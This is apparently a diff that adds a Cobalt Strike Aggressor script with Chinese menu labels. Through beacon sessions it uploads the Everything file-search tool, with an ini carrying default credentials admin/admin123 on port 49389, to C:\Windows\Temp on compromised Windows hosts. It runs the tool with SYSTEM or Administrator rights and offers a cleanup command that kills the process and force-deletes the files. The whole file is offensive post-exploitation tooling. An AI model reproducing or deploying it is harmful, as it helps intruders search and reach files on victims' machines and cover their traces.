@@ -1,0 +1,42 @@
+	menu "Everything" {
+			item "上传 Everything" {
+				$bid = $1;
+				$dialog = dialog("上传 Everything", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &evething);
+                dialog_description($dialog, "windows 2003以后服务器用当前会话system权限启动,windows 2003以及windows 2003以下服务器当前会话为Administrator/system权限启动");
+				drow_text($dialog, "UploadPath",  "上传路径: "); 	
+				dbutton_action($dialog, "上传");
+				dialog_show($dialog);
+        }
+sub evething {
+
+    bcd($bid, $3['UploadPath']);
+    if (-is64 $bid) {
+        bupload($bid, script_resource("/script/Everything/x64/Everything.exe"));
+        bupload($bid, script_resource("/script/Everything/x64/Everything.ini"));
+    }else{
+        bupload($bid, script_resource("/script/Everything/x86/Everything.exe"));
+        bupload($bid, script_resource("/script/Everything/x86/Everything.ini"));
+    }
+}
+
+    item "运行 Everything"{
+                    $bid = $1['@'];
+                    $Dialog = dialog("运行Evething",%(port =>"默认端口49389",username => "默认admin",password => "默认admin123",bid => $bid),&Evething_run);
+                    dialog_description($Dialog, "修改默认配置需要在Everything.ini进行修改,这里修改无效.删除文件有bug,需要点击两次删除文件操作");
+                    dbutton_action($Dialog, "运行");
+                    dialog_show($Dialog);
+                }
+
+sub Evething_run{
+    {
+    bshell($bid, "Everything.exe");
+
+    }	
+}
+        	item "删除 Everything"{
+        	local('$bid');
+        	foreach $bid ($1){
+                bshell($1, "taskkill -f /im Everything.exe & del /f /s /q Everything.exe & del /f /s /q Everything.ini");
+                }
+		}
+}
